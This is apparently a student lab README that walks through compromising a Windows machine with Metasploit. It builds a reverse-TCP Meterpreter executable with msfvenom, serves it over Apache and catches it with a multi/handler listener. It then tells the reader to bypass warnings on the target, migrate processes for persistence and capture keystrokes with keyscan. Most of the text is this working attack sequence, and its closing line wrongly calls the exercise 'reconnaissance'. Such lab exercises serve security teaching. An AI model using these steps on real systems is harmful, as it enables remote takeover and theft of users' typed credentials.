# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/c98f03c7-da1c-4f3e-a54e-12a8f4cbc031)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp 
LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT
![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/5863ecc1-03b2-43e0-bca2-ff056e341ac5)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/5c2fb968-50fd-49b9-97f8-174e573bb774)

Start apache server sudo systemctl apache2 start

![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/1e44318b-2388-4d6f-b03b-7d5dd3f8d577)

Check the status of apache2 

![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/b490aa70-26fe-4c9e-b951-e4cafe7a176d)

## Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit 

![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/7c923e4f-358a-443b-ba14-1c6b51c8157c)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 
![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/b849c45d-b731-432a-be4b-676ac9e7de71)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 
![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/100960dd-96de-4c8a-8246-f140accb5b7a)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/d1929f8d-2234-4dee-b65e-3311010dae5d)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 

![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/0597a407-34bf-4bdd-9d2b-502876e6bc5d)

keyscan_dump Shows the keystrokes captured so far 

![image](https://github.com/subalakshmivenkat/Compromising-windows-using-Metasploit/assets/119393477/9f66c40e-8320-47e0-b97a-f7119a424c23)


## RESULT:
The Metasploit framework for reconnaissance is examined successfully
